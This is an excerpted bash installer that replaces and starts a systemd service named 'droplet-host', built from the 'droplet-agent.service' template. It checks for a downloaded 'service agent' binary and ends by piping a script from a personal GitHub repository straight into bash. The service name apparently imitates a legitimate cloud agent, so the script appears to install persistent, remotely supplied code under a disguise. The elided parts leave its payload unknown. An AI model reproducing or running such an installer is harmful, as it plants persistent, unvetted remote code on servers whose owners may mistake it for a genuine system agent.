...
# Stop existing droplet-host service if running
if systemctl is-active --quiet droplet-host.service; then
    echo "➜ Stopping existing droplet-host service..."
    systemctl stop droplet-host.service
    ...
    if systemctl is-active --quiet droplet-host.service; then
        ...
        systemctl kill droplet-host.service
        sleep 3
    fi
fi

# Remove existing service agent file if it exists and is busy
if [[ -f "$AGENT_PATH" ]]; then
    echo "➜ Removing existing service agent file..."
...
if [[ ! -f "$AGENT_PATH" ]]; then
  echo "❌ Failed to download service agent to $AGENT_PATH"
  exit 1
fi
...
# Create systemd service using droplet-agent.service as template
echo "➜ Creating systemd service based on droplet-agent.service..."
...
echo "➜ Reloading systemd and starting droplet-host.service..."
systemctl daemon-reload
systemctl enable droplet-host.service

# Start service with error handling
if systemctl start droplet-host.service; then
    ...
    if systemctl is-active --quiet droplet-host.service; then
        echo "➜ Service status:"
        systemctl status droplet-host.service --no-pager
    else
        echo "❌ Service failed to start properly"
        echo "➜ Service logs:"
        journalctl -u droplet-host.service --no-pager -n 20
        exit 1
    fi
else
...
bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/service-dis-host.sh)
